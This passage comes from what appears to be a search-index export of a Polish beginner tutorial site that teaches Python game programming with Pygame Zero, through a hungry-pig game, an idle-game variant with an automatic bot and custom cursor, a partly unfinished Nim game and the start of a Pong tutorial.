zgodnie z jej pr\u0119dko\u015bci\u0105 w poziomie i pionie\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    # Je\u017celi \u015bwinia wpad\u0142a na buraka\n    if pig.colliderect(beet):\n        # Przemieszczamy buraka w nowe, losowe miejsce na ekranie\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        # Przyspieszamy \u015bwini\u0119\n        pig.v += 0.8\n        # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w\n        pig.points += 1\n        # Odgrywamy d\u017awi\u0119k \u015bwini\n        sounds.pig.play()\n\n    # Je\u017celi \u015bwinia wypad\u0142a poza ekran\n    if pig.x &lt; 0 or pig.x &gt; WIDTH or pig.y &lt; 0 or pig.y &gt; HEIGHT:\n        # Zapami\u0119tujemy, \u017ce gra si\u0119 zako\u0144czy\u0142a\n        pig.dead = True\n        # Zmieniamy pozycj\u0119 \u015bwini\n        pig.x = WIDTH / 2\n        pig.y = HEIGHT / 3\n        # Zmieniamy grafik\u0119 \u015bwini\n        pig.image = \"pig_dead\"\n\n# Funkcja odczytuj\u0105ca klikni\u0119cia klawiszy na klawiaturze\ndef on_key_down(key):\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if pig.dead:\n        # Sprawdzamy, czy naci\u015bni\u0119to przycisk spacji\n        if key == keys.SPACE:\n            # Restartujemy gr\u0119\n            restart()\n\n        # Ko\u0144czymy, aby nie mo\u017cna ju\u017c by\u0142o porusza\u0107 \u015bwini\u0105\n        return\n\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w lewo\n    if key == keys.LEFT:\n        # Zmieniamy pr\u0119dko\u015b\u0107 \u015bwini\n        pig.vx = -pig.v\n        pig.vy = 0\n        # Zmieniamy grafik\u0119 \u015bwini\n        pig.image = \"pig_left\"\n\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w prawo\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w g\u00f3r\u0119\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w d\u00f3\u0142\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\n# Funkcja restartuj\u0105ca gr\u0119\ndef restart():\n    # Ustawiamy pocz\u0105tkow\u0105 grafik\u0119 \u015bwini\n    pig.image = \"pig_down\"\n    # Ustawiamy pocz\u0105tkow\u0105 pozycj\u0119 \u015bwini na ekranie\n    pig.x = WIDTH / 2\n    pig.y = HEIGHT / 2\n    # Ustawiamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 poziom\u0105 i pionow\u0105 \u015bwini\n    pig.vx = 0\n    pig.vy = 0\n    # Ustawiamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 g\u0142\u00f3wn\u0105 \u015bwini\n    pig.v = 3\n    # Ustawiamy pocz\u0105tkow\u0105 liczb\u0119 punkt\u00f3w\n    pig.points = 0\n    # Zapami\u0119tujemy, czy gra si\u0119 zako\u0144czy\u0142a\n    pig.dead = False\n\n# Wywo\u0142ujemy funkcj\u0119 restart, aby ustawi\u0107 pocz\u0105tkowe parametry naszej gry\nrestart()\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre> <p>Pe\u0142na implementacja dost\u0119pna jest tak\u017ce poni\u017cej.</p> <p>G\u0142odna \u015bwinia</p>"},{"location":"learning-by-games/python/pygame-zero/idle/","title":"Gra typu idle","text":""},{"location":"learning-by-games/python/pygame-zero/idle/#wstep","title":"Wst\u0119p","text":"<p>Tym razem stworzymy gr\u0119, w kt\u00f3rej postacie porusza\u0107 b\u0119d\u0105 si\u0119 same. B\u0119dzie to gra typu idle, w kt\u00f3rej b\u0119dziemy czeka\u0107, a\u017c uzbieramy wystarczaj\u0105co du\u017co punkt\u00f3w, by m\u00f3c kupi\u0107 kolejne ulepszenie. Nasz\u0105 gr\u0119 oprzemy na stworzonej ju\u017c wcze\u015bniej grze \"G\u0142odna \u015bwinia\", dzi\u0119ki czemu b\u0119dziemy mogli skupi\u0107 si\u0119 na nowych elementach rozgrywki.</p>"},{"location":"learning-by-games/python/pygame-zero/idle/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Jak zaprogramowa\u0107 posta\u0107 tak, by sama \"gra\u0142a\".</li> <li>Jak stworzy\u0107 gr\u0119 typu idle.</li> <li>Jak stworzy\u0107 prosty interfejs z przyciskami.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/idle/#materiay-do-pobrania","title":"Materia\u0142y do pobrania","text":""},{"location":"learning-by-games/python/pygame-zero/idle/#grafiki","title":"Grafiki","text":"<p>Umieszczamy w katalogu images.</p> <p> Grafiki do gry typu idle</p>"},{"location":"learning-by-games/python/pygame-zero/idle/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>https://kenney.nl/</li> <li>https://comigo.itch.io/farm-puzzle-animals</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/idle/#nasz-cel","title":"Nasz cel","text":""},{"location":"learning-by-games/python/pygame-zero/idle/#wstepna-konfiguracja","title":"Wst\u0119pna konfiguracja","text":"<p>Zaczynamy standardowo: tworzymy nowy projekt, instalujemy bibliotek\u0119, pobieramy materia\u0142y i umieszczamy je w odpowiednich miejscach. Nasz projekt mo\u017cemy nazwa\u0107 np. \"IdlePig\". Gdy ju\u017c utworzymy projekt, tworzymy w nim nowy katalog images. Nast\u0119pnie pobieramy wy\u017cej wymienione materia\u0142y, rozpakowujemy je, a zawarto\u015b\u0107 przerzucamy do nowego katalogu. Pozosta\u0142o nam jeszcze zainstalowa\u0107 bibliotek\u0119: w okienku terminala wypisujemy standardowo polecenie <code>pip install pgzero</code>.</p>"},{"location":"learning-by-games/python/pygame-zero/idle/#podstawowy-szablon","title":"Podstawowy szablon","text":"<p>Nasz\u0105 gr\u0119 oprzemy na grze \"G\u0142odna \u015bwinia\", dlatego zamiast zaczyna\u0107 od pustego kodu, zaczniemy od gotowej gry, kt\u00f3r\u0105 ju\u017c wcze\u015bniej stworzyli\u015bmy. Nie wszystko nam jednak b\u0119dzie potrzebne. Poniewa\u017c nasza gra b\u0119dzie \"niesko\u0144czona\", to usuniemy elementy zwi\u0105zane z zako\u0144czeniem gry. Usuniemy tak\u017ce elementy zwi\u0105zane z wykorzystaniem czcionki i d\u017awi\u0119k\u00f3w, nie b\u0119d\u0105 nam tutaj potrzebne. Podobnie post\u0105pimy z instrukcj\u0105 przyspieszaj\u0105c\u0105 \u015bwini\u0119 po zjedzeniu buraka, poniewa\u017c w naszej nowej grze b\u0119dziemy kupowa\u0107 ulepszenia pr\u0119dko\u015bci \u015bwini. Dopiszemy tak\u017ce bibliotek\u0119 pygame, kt\u00f3ra przyda nam si\u0119 p\u00f3\u017aniej. Kod, od kt\u00f3rego zaczniemy, widoczny jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\nimport pygame\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Idle Pig\"\n\npig = Actor(\"pig_down\")\npig.x = WIDTH / 2\npig.y = HEIGHT / 2\npig.vx = 0\npig.vy = 0\npig.v = 3\npig.points = 0\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\")\n\ndef update():\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.points += 1\n\ndef on_key_down(key):\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#automatyczna-swinia","title":"Automatyczna \u015bwinia","text":"<p>Nasz\u0105 \u015bwini\u0105 nie b\u0119dziemy ju\u017c porusza\u0107 za pomoc\u0105 przycisk\u00f3w na klawiaturze, tylko b\u0119dzie ona porusza\u0107 si\u0119 automatycznie. Dlatego zmienimy nazw\u0119 naszej funkcji <code>on_key_down</code> na <code>bot</code> i usuniemy parametr key.</p> <pre><code>def bot():\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n</code></pre> <p>Teraz zastan\u00f3wmy si\u0119, kiedy \u015bwinia ma si\u0119 porusza\u0107 w danym kierunku. Odpowied\u017a jest prosta: \u015bwinia powinna zawsze pod\u0105\u017ca\u0107 w kierunku buraka. W zwi\u0105zku z tym b\u0119dziemy kierowa\u0107 \u015bwini\u0119 w danym kierunku, je\u017celi w tym kierunku znajduje si\u0119 burak. Musimy jednak wzi\u0105\u0107 jeszcze pod uwag\u0119 pr\u0119dko\u015b\u0107 \u015bwini, tak aby nie omin\u0119\u0142a buraka poruszaj\u0105c si\u0119 za szybko.</p>"},{"location":"learning-by-games/python/pygame-zero/idle/#ruch-w-lewo","title":"Ruch w lewo","text":"<p>\u015awinia poruszy si\u0119 w lewo, gdy burak znajduje si\u0119 po jej lewej stronie, a odleg\u0142o\u015b\u0107 od niego w poziomie jest wi\u0119ksza b\u0105d\u017a r\u00f3wna pr\u0119dko\u015bci \u015bwini. \u017beby to sprawdzi\u0107 policzymy odleg\u0142o\u015b\u0107 poziom\u0105 pomi\u0119dzy \u015bwini\u0105 a burakiem (<code>pig.x - beet.x</code>) i por\u00f3wnamy j\u0105 z pr\u0119dko\u015bci\u0105 \u015bwini (<code>pig.v</code>). Tym por\u00f3wnaniem zast\u0105pimy warunek <code>key == keys.LEFT</code> odpowiadaj\u0105cy wcze\u015bniej za ruch w lewo.</p> <pre><code>def bot():\n    if pig.x - beet.x &gt;= pig.v:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"    \n\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#ruch-w-prawo","title":"Ruch w prawo","text":"<p>Podobnie post\u0105pimy z ruchem w prawo. Tym razem musimy jednak sprawdzi\u0107 odleg\u0142o\u015b\u0107 w poziomie buraka od \u015bwini. Nowym warunkiem zast\u0119pujemy drugi warunek (<code>key == keys.RIGHT</code>).</p> <pre><code>def bot():\n    ...\n\n    if beet.x - pig.x &gt;= pig.v:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#ruch-w-gore","title":"Ruch w g\u00f3r\u0119","text":"<p>Przy ruchu g\u00f3r\u0119 sprawdzimy odleg\u0142o\u015b\u0107 w pionie pomi\u0119dzy \u015bwini\u0105 a burakiem. Zast\u0119pujemy trzeci warunek (<code>key == keys.UP</code>).</p> <pre><code>def bot():\n    ...\n\n    if pig.y - beet.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#ruch-w-do","title":"Ruch w d\u00f3\u0142","text":"<p>Na koniec sprawdzamy odleg\u0142o\u015b\u0107 w pionie pomi\u0119dzy burakiem a \u015bwini\u0105. Zast\u0119pujemy czwarty, ostatni warunek (<code>key == keys.DOWN</code>).</p> <pre><code>def bot():\n    ...\n\n    if beet.y - pig.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#wywoanie-automatycznego-ruchu","title":"Wywo\u0142anie automatycznego ruchu","text":"<p>Pozosta\u0142o nam wywo\u0142a\u0107 nasz\u0105 funkcj\u0119 bot na pocz\u0105tku funkcji update, tak by \u015bwinia porusza\u0142a si\u0119 sama.</p> <pre><code>def update():\n    bot()\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#peny-kod","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport pygame\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Idle Pig\"\n\npig = Actor(\"pig_down\")\npig.x = WIDTH / 2\npig.y = HEIGHT / 2\npig.vx = 0\npig.vy = 0\npig.v = 3\npig.points = 0\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\")\n\ndef update():\n    bot()\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.points += 1\n\ndef bot():\n    if pig.x - beet.x &gt;= pig.v:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if beet.x - pig.x &gt;= pig.v:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if pig.y - beet.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if beet.y - pig.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#poszerzenie-ekranu","title":"Poszerzenie ekranu","text":"<p>Przyciski do kupowania ulepsze\u0144 w naszej grze umie\u015bcimy z prawej strony ekranu. W tym celu musimy poszerzy\u0107 nasz ekran, powiedzmy o \\(400\\) pikseli. Zwi\u0119kszamy wi\u0119c warto\u015b\u0107 szeroko\u015bci (WIDTH).</p> <pre><code>WIDTH = 1200\nHEIGHT = 800\n</code></pre> <p>Teraz jednak po\u0142o\u017cenie zar\u00f3wno punkt\u00f3w jak i \u015bwini nie b\u0119dzie poprawne. Dlatego dopiszemy sobie jeszcze jedn\u0105 sta\u0142\u0105, kt\u00f3ra b\u0119dzie przechowywa\u0142a szeroko\u015b\u0107 naszego panelu z przyciskami. Nazwiemy j\u0105 PANEL i przypiszemy jej warto\u015b\u0107 \\(400\\). Dopiszemy j\u0105 zaraz pod okre\u015bleniem wymiar\u00f3w okna gry.</p> <pre><code>WIDTH = 1200\nHEIGHT = 800\nPANEL = 400\n</code></pre> <p>Pozosta\u0142o nam skorzysta\u0107 z naszej nowej sta\u0142ej podczas ustalania pozycji element\u00f3w na ekranie. Zacznijmy od \u015bwini. Zamiast umieszcza\u0107 j\u0105 na \u015brodku ca\u0142ego ekranu w poziomie, to umie\u015bcimy j\u0105 na \u015brodku w\u0142a\u015bciwego pola gry. W tym celu, do wsp\u00f3\u0142rz\u0119dnej \\(x\\) \u015bwini przypiszemy <code>(WIDTH - PANEL) / 2</code>.</p> <pre><code>pig = Actor(\"pig_down\")\npig.x = (WIDTH - PANEL) / 2\npig.y = HEIGHT / 2\n...\n</code></pre> <p>Podobnie zrobimy w przypadku punkt\u00f3w. Ustalaj\u0105c ich pozycj\u0119 w poziomie zamiast <code>WIDTH / 2</code> napiszemy <code>(WIDTH - PANEL) / 2</code>.</p> <pre><code>def draw():\n    ...\n    screen.draw.text(f\"{pig.points}\", center=((WIDTH - PANEL) / 2, 50), fontsize=60, color=\"#fdee00\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#peny-kod_1","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport pygame\n\nWIDTH = 1200\nHEIGHT = 800\nPANEL = 400\n\nTITLE = \"Idle Pig\"\n\npig = Actor(\"pig_down\")\npig.x = (WIDTH - PANEL)\npig.y = HEIGHT / 2\npig.vx = 0\npig.vy = 0\npig.v = 3\npig.points = 0\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    screen.draw.text(f\"{pig.points}\", center=((WIDTH - PANEL), 50), fontsize=60, color=\"#fdee00\")\n\ndef update():\n    bot()\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.points += 1\n\ndef bot():\n    if pig.x - beet.x &gt;= pig.v:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if beet.x - pig.x &gt;= pig.v:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if pig.y - beet.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if beet.y - pig.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#kursor","title":"Kursor","text":"<p>Zajmijmy si\u0119 teraz kursorem w naszej grze. Dlaczego jest nam on potrzebny? To on b\u0119dzie nowym swoistym g\u0142\u00f3wnym \"graczem\" w naszej grze. To nim b\u0119dziemy przecie\u017c sterowa\u0107! To tak\u017ce w nim b\u0119dziemy przechowywa\u0107 najwa\u017cniejsze informacje, takie jak punkty, pr\u0119dko\u015bci postaci czy te\u017c punkty zdobywane za warzywa.</p>"},{"location":"learning-by-games/python/pygame-zero/idle/#tworzymy-kursor","title":"Tworzymy kursor","text":"<p>Na pocz\u0105tku dodajemy nowego aktora. Nazwiemy go cursor, utworzymy go z grafiki cursor.png i zapiszemy zaraz przed funkcj\u0105 draw.</p> <pre><code>cursor = Actor(\"cursor\")\n</code></pre> <p>Teraz pozosta\u0142o nam wy\u015bwietli\u0107 go na ekranie. Dopisujemy rysowanie kursora na ko\u0144cu funkcji draw, tak aby wy\u015bwietla\u0142 si\u0119 zawsze na wierzchu.</p> <pre><code>def draw():\n    ...\n    cursor.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#przemieszczamy-kursor","title":"Przemieszczamy kursor","text":"<p>Nasz kursor powinien zawsze znajdowa\u0107 si\u0119 tam, gdzie aktualnie znajduje si\u0119 wska\u017anik myszy. Do tego przyda nam si\u0119 nowa funkcja odczytuj\u0105ca ruchy myszy: <code>on_mouse_move</code>. Nasza funkcja przyjmie jeden parametr pos, kt\u00f3ry b\u0119dzie zawiera\u0142 aktualn\u0105 pozycj\u0119 wska\u017anika myszy. Jest to jedna z funkcji znajduj\u0105cych si\u0119 w bibliotece Pygame Zero. Nasz\u0105 funkcj\u0119 dopiszemy zaraz przed funkcj\u0105 bot, tak aby zachowa\u0107 pewien porz\u0105dek kodu.</p> <pre><code>def on_mouse_move(pos):\n</code></pre> <p>Wewn\u0105trz funkcji potrzebujemy tylko jednej instrukcji: przypisania obecnej pozycji wska\u017anika myszy (pos) do pozycji naszego kursora (cursor.pos).</p> <pre><code>def on_mouse_move(pos):\n    cursor.pos = pos\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#ukrywamy-wskaznik-myszy","title":"Ukrywamy wska\u017anik myszy","text":"<p>Poniewa\u017c nasz nowy kursor ma zast\u0105pi\u0107 wska\u017anik myszy, to ukryjemy dotychczasowy wska\u017anik za pomoc\u0105 polecenia <code>pygame.mouse.set_visible(False)</code> z biblioteki pygame. Instrukcj\u0119 dopisujemy zaraz przed uruchomieniem gry, czyli przed <code>pgzrun.go()</code>.</p> <pre><code>pygame.mouse.set_visible(False)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/idle/#peny-kod_2","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport pygame\n\nWIDTH = 1200\nHEIGHT = 800\nPANEL = 400\n\nTITLE = \"Idle Pig\"\n\npig = Actor(\"pig_down\")\npig.x = (WIDTH - PANEL)\npig.y = HEIGHT / 2\npig.vx = 0\npig.vy = 0\npig.v = 3\npig.points = 0\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ncursor = Actor(\"cursor\")\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    screen.draw.text(f\"{pig.points}\", center=((WIDTH - PANEL), 50), fontsize=60, color=\"#fdee00\")\n    cursor.draw()\n\ndef update():\n    bot()\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.points += 1\n\ndef on_mouse_move(pos):\n    cursor.pos = pos\n\ndef bot():\n    if pig.x - beet.x &gt;= pig.v:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if beet.x - pig.x &gt;= pig.v:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if pig.y - beet.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if beet.y - pig.y &gt;= pig.v:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npygame.mouse.set_visible(False)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/nim/","title":"Gra Nim","text":""},{"location":"learning-by-games/python/pygame-zero/nim/#wstep","title":"Wst\u0119p","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/nim/#gra","title":"Gra","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/nim/#generujemy-pole-gry","title":"Generujemy pole gry","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/nim/#rysujemy-pole-gry","title":"Rysujemy pole gry","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/nim/#usuwamy-pola","title":"Usuwamy pola","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/nim/#odczytujemy-klikniecia","title":"Odczytujemy klikni\u0119cia","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/nim/#pena-gra-z-komentarzami","title":"Pe\u0142na gra z komentarzami","text":"<pre><code>import pgzrun\n\nWIDTH = 800\nHEIGHT = 1000\n\n# Tutaj definiujemy liczb\u0119 wierszy i kolumn\nrows = 2\ncolumns = 5\n\n# Definiujemy marginesy (odst\u0119py) pomi\u0119dzy polami gry\nmargin = 10\n\n# Lsita do zapami\u0119tania p\u00f3l gry\nfields = []\n\ndef draw():\n    # Wype\u0142niamy t\u0142o bia\u0142ym kolorem\n    screen.fill(\"white\")\n    # Rysujemy pola gry\n    draw_fields()\n\n# Funkcja rysuj\u0105ca pola gry\ndef draw_fields():\n    # Przechodzimy przez wszystkie wiersze\n    for row in fields:\n        # I przez wszystkie elementy w wierszu\n        for el in row:\n            # Ka\u017cdy element rysujemy jako czerwony prostok\u0105t\n            screen.draw.filled_rect(el, \"red\")\n\n# Funkcja wywo\u0142ywana po klikni\u0119ciu mysz\u0105\ndef on_mouse_down(pos):\n    # Przechodzimy przez ka\u017cdy wiersz\n    for r in range(len(fields)):\n        # I przez ka\u017cd\u0105 kolumn\u0119 w wierszu\n        for c in range(len(fields[r])):\n            # Sprawdzamy, czy gracz klikn\u0105\u0142 w pole w wierszu r i kolumnie c\n            if fields[r][c].collidepoint(pos):\n                # Je\u017celi tak, to usuwamy wskazane pole i wszystkie przed nim z lewej strony w danym wierszu\n                remove_field(r, c)\n                # A nast\u0119pnie ko\u0144czymy sprawdzanie\n                return\n\n# Funkcja usuwaj\u0105ca wskazane pole i wszystkie znajduj\u0105ce si\u0119 przed nim w danym wierszu\ndef remove_field(r, c):\n    # Dla ka\u017cdego pola we wskazanym wierszu, od lewej do klikni\u0119tego pola\n    for i in range(c + 1):\n        # Usuwamy pole z pocz\u0105tku wiersza\n        fields[r].pop(0)\n\n# Funkcja generuj\u0105ca pola gry\ndef generate_fields():\n    # Obliczamy wysoko\u015b\u0107 i szeroko\u015b\u0107 jednego pola, bior\u0105c pod uwag\u0119 liczb\u0119 wierszy i wysoko\u015b\u0107 okna\n    rect_height = (HEIGHT - (rows * margin)) / rows\n    rect_width = (WIDTH - (columns * margin)) / columns\n    # Dla ka\u017cdego wiersza\n    for r in range(rows):\n        # Dodajemy pust\u0105 list\u0119 do naszej listy p\u00f3l - pusty wiersz\n        fields.append([])\n        # Dla ka\u017cdej kolumny\n        for c in range(columns):\n            # Tworzymy nowe pole gry - prostok\u0105t umieszczony w wierszu r i kolumnie c\n            rect = Rect((rect_width + margin) * c, (rect_height + margin) * r, rect_width, rect_height)\n            # Dodajemy nowy prostok\u0105t do obecnego wiersza\n            fields[r].append(rect)\n\n# Przed startem gry generujemy plansz\u0119\ngenerate_fields()\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/","title":"Pong","text":""},{"location":"learning-by-games/python/pygame-zero/pong/#wstep","title":"Wst\u0119p","text":"<p>Klasyczn\u0105 gr\u0119 Pong stworzon\u0105 przez firm\u0119 Atari zna chyba ka\u017cdy. Dwie paletki po przeciwleg\u0142ych brzegach ekranu, pi\u0142ka odbijaj\u0105ca si\u0119 od paletek - ta prosta w swoich za\u0142o\u017ceniach gra by\u0142a jednak czym\u015b prze\u0142omowym w swoich czasach.</p> <p>Dzisiaj spr\u00f3bujemy t\u0119 gr\u0119 odtworzy\u0107 w troch\u0119 bardziej wsp\u00f3\u0142czesnym \u015brodowisku i z od\u015bwie\u017con\u0105 grafik\u0105. Do dzie\u0142a!</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Obs\u0142ugi dw\u00f3ch graczy jednocze\u015bnie.</li> <li>Symulacji prostej fizyki odbijania si\u0119 pi\u0142ki.</li> <li>Obs\u0142ugi zako\u0144czenia gry i wy\u015bwietlenia wyniku.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/pong/#grafiki-do-pobrania","title":"Grafiki do pobrania","text":"<p>Umieszczamy w katalogu images.</p> <p> Grafiki do gry Pong</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>https://kenney.nl/</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/pong/#nasz-cel","title":"Nasz cel","text":"<p>Spr\u00f3bujmy przeanalizowa\u0107 powy\u017csz\u0105 animacj\u0119. Wyr\u00f3\u017cnijmy elementy graficzne, co pomo\u017ce nam zaimplementowa\u0107 nasz\u0105 gr\u0119:</p> <ul> <li>szare t\u0142o,</li> <li>\u017c\u00f3\u0142ta linia po \u015brodku dziel\u0105ca plansz\u0119 na dwie cz\u0119\u015bci,</li> <li>punkty wy\u015bwietlane na g\u00f3rze ekranu,</li> <li>dwie paletki - jedna przy lewym brzegu, druga przy prawym,</li> <li>pi\u0142ka.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/pong/#wstepna-konfiguracja","title":"Wst\u0119pna konfiguracja","text":"<p>Zaczynamy standardowo: tworzymy nowy projekt, instalujemy bibliotek\u0119, pobieramy materia\u0142y i umieszczamy je w odpowiednich miejscach. Nasz projekt mo\u017cemy nazwa\u0107 np. \"Pong\". Gdy ju\u017c utworzymy projekt, tworzymy w nim nowy katalog: images. Nast\u0119pnie pobieramy wy\u017cej wymienione materia\u0142y, rozpakowujemy je, a zawarto\u015b\u0107 przerzucamy do katalogu images. Pozosta\u0142o nam jeszcze zainstalowa\u0107 bibliotek\u0119: w okienku terminala wypisujemy standardowo polecenie <code>pip install pgzero</code>.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#podstawowy-szablon","title":"Podstawowy szablon","text":"<p>Jako wymiary gry przyjmiemy \\(800\\times600\\) (szeroko\u015b\u0107 \\(800\\) i wysoko\u015b\u0107 \\(600\\)).</p> <p>Ustalmy tak\u017ce tytu\u0142 naszej gry: \"Pong\".</p> <pre><code>import pgzrun\nimport random\n\n# Wymiary okna\nWIDTH = 800\nHEIGHT = 600\n\n# Tytu\u0142 gry\nTITLE = \"PONG\"\n\ndef draw():\n    pass\n\ndef update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#to-gry","title":"T\u0142o gry","text":"<p>Na pocz\u0105tek rzecz prosta - t\u0142o gry. Jak ju\u017c ustalili\u015bmy na t\u0142o sk\u0142ada si\u0119 szary kolor i \u017c\u00f3\u0142ta linia na \u015brodku ekranu. Zacznijmy od szarego koloru. </p>"},{"location":"learning-by-games/python/pygame-zero/pong/#szare-to","title":"Szare t\u0142o","text":"<p>Dla u\u0142atwienia kolor t\u0142a zapami\u0119tamy w zmiennej <code>bg_color</code>, 